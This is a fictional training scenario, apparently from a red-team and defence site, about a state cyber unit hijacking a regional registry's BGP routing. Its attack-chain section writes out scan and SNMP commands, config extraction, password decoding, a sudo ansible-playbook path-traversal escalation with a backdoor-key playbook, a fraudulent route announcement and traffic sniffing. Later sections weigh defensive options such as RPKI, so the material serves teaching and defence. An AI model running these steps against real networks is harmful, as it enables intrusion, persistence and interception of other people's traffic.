# Operation Toadstool Takeover

Fungolia's frontier runs on FungusFiber Internet, the regional registry whose core routers decide which
way the packets go, and a registry is only ever as sound as the oldest box still answering on its
perimeter. Shadow6, the cyber wing of the Borogravian regency, did not come to break FungusFiber. It
came to own the routing, quietly, and to point the frontier's traffic wherever the regency liked.

No border tap needed. Routing is a commons. When a registry announces a route it announces it to
the whole internet, and the Establishment, which runs its own registry, reads the same global
table everyone reads. It saw a Fungolian prefix start arriving from the wrong place the moment the
announcement propagated, no taps, no covert access, just the public table saying something that could not
be true. The city's stake is plain enough: its traffic to and through the frontier rides FungusFiber's
routes, and whoever owns the ally's registry owns the path the packets take.

## On the backbone

- [FungusFiber Internet](https://red.tymyrddin.dev/docs/earthworks/fungusfiber/): the regional registry,
  Fungolia's local internet registry, whose core routers announce the frontier's routes to the world, and
  whose habit of leaving legacy management services answering on the perimeter makes the oldest box the
  way in.
- Shadow6, the Borogravian regency's cyber wing: under standing orders to paralyse, not to wreck, so it
  wants the routing intact and obedient, a highway it can point rather than a road it has to close.
- [The Civic Defence Establishment](../establishment/index.rst): which runs its own registry
  and reads the global table everyone reads, and which assumes its own traffic is safe because it is
  encrypted, forgetting that a hijacked registry does not need to read the letters, only to carry them
  past a room with the lights off.
- [The Civil Observers' Society](../society/index.rst): the amateurs, who noticed a flurry of outdated
  SNMP polls against the public gateways and are posting cheerfully about inefficient network maintenance,
  not knowing they are narrating a nation-state walking in.

## The fruiting chain

Shadow6 needed no zero-day. It needed the boxes FungusFiber had stopped looking at, and the Establishment,
reading the public table, reconstructed the climb after the fact.

1. The spore scan: a stealthy SYN sweep across the provider's public range
   (`nmap -sS -T4 -Pn 10.0.0.0/24 -oG initial_scan.gnmap`) found the live edges, and a service probe of
   one of them (`nmap -sV -sC -O -p 22,80,161 10.0.0.5`) turned up an ancient edge router running badly
   outdated administration software. An SNMP check (`snmp-check 10.0.0.5 -c public`) found the management
   protocol answering, and answering to a weak read-write community string, `fungus`.
2. The foothold: with the community string, an explicit object-identifier request walked the router's own
   configuration straight out to an attacker TFTP server
   (`snmpwalk -v2c -c fungus 10.0.0.5 .1.3.6.1.4.1.9.9.96.1.1.1.1.2`). The dumped `router-config.cfg`
   carried a legacy Type-7 line, `enable password 7 0822455D0A165B1E1F`, which is obfuscation rather than
   encryption, and a standard decryptor turned it back into `FungusFan99!` in a blink. An
   `ssh admin@10.0.0.5` later, the prompt read `FungusFiber-Core-Router#`.
3. The spread: from the core router, `show ip route` and `show cdp neighbors` drew the internal map and
   named a management segment, `192.168.5.0/24`, with an administration server at `192.168.5.10`. The
   running configuration referenced an automated maintenance script keyed on local SSH chains, and the
   matching private key was sitting unencrypted in the router's temporary store, `/tmp/backup-key.priv`.
4. The core: the stolen key crossed the boundary (`ssh -i backup-key.priv backup-user@192.168.5.10`), and
   on the management host a `sudo -l` showed the local account permitted to run `/usr/bin/ansible-playbook`
   as root without a password, restricted, in theory, to playbooks under `/opt/automation/`.
5. The fruiting body: because the host trusted Ansible to rewrite files as root, Shadow6 wrote a one-task
   playbook to drop its own key into root's `authorized_keys`,

   ```yaml
   - hosts: localhost
     become: yes
     tasks:
       - name: Install backdoor key
         ansible.builtin.lineinfile:
           path: /root/.ssh/authorized_keys
           line: "ssh-rsa AAAAB3NzaC1yc2E... attacker@shadow6"
           create: yes
           mode: '0600'
   ```

   and walked straight through the path restriction with a `..`
   (`sudo /usr/bin/ansible-playbook /opt/automation/../tmp/pwn.yml`). The prompt came back
   `root@mgmt-server:~#`.
6. Becoming the network: with root on the management host and the core router both, Shadow6 announced a
   route it had no right to,

   ```text
   FungusFiber-Core-Router# configure terminal
   FungusFiber-Core-Router(config)# router bgp 64500
   FungusFiber-Core-Router(config-router)# network 198.51.100.0 mask 255.255.255.0
   FungusFiber-Core-Router(config-router)# end
   ```

   and because adjacent networks trust whatever FungusFiber announces as an official registry, the
   fraudulent `198.51.100.0/24` propagated across the internet in moments, and the compromised router
   became the preferred path for everything bound for that block. A passive sniffer
   (`sudo tcpdump -nni eth0 net 198.51.100.0/24`) read the diverted streams and forwarded them on to their
   real destination, so nothing looked broken to anyone sending.

What the Establishment sees, on its own registry, is the contradiction: a Fungolian prefix originating
from an autonomous system that has no business announcing it, arriving by every route monitor the city
runs, while FungusFiber's own dashboards report a quiet morning.

## Decision points

- Whether to reject the bad origin at the city's own borders. The Establishment can enforce RPKI on its
  registry and drop the route as an invalid origin, which protects the city's traffic in minutes, and
  protects no one who has not done the same, and leaves the hijack standing everywhere RPKI is not.
- Whether to take it to FungusFiber quietly. The clean fix is the ally withdrawing the announcement and
  turning out its compromised boxes, which the city cannot do for it, and which moves at the speed of a
  foreign operations desk being persuaded it has a problem it cannot see.
- Whether to let the Society carry it. The amateurs are a post away from reporting inefficient maintenance
  to FungusFiber's support desk, and letting them surfaces the anomaly in public without the city having
  to explain how it knew first, at the cost of telling Shadow6, in the same breath, that the route was
  read.

The hijack buys Borogravia the path itself. No cable was cut and no message was broken, a weak community
string and an unpatched router were enough to make the frontier's traffic take a detour through a
Borogravian room, and every packet that mattered went the long way round of its own accord, politely, on
time.

## When the routes turn

- The detour becomes a habit. While the bad origin stands, everything bound for the hijacked block flows
  through the regency's collector, encrypted or not, and the metadata alone, who speaks to whom and when,
  draws the map the regency wanted.
- The clean-up runs slow. FungusFiber can withdraw the announcement, but the router that made it is still
  owned, and the backdoor key in root's `authorized_keys` survives the withdrawal, so the route can return
  the moment the noise dies down.
- The blast spreads. A registry that can be made to announce one prefix can be made to announce a hundred,
  and a regency that owns the frontier's routing can blind a stretch of the alliance to its own traffic
  without sending a soldier near the border.

## Behind the announcement

- The impact family this belongs to, where a provider's own administration tools become the trap:
  [administrative hijack](../counter/impact/administrative-hijack.md).
- The routing layer turned into a traffic siphon, and the validation that answers it:
  [availability under attack](../counter/impact/availability.md), [BGP origin validation](../counter/network/exposure.md),
  and [hunting a route-origin hijack](../counter/network/runbooks/bgp-hijack-hunt.md).
- The exposure a single regional registry concentrates:
  [concentration and dependency](../counter/impact/concentration.md).
- The technical lab execution behind this narrative:
  [FungusFiber: Operation Toadstool Takeover](https://red.tymyrddin.dev/docs/earthworks/fungusfiber/toadstool-takeover.html).
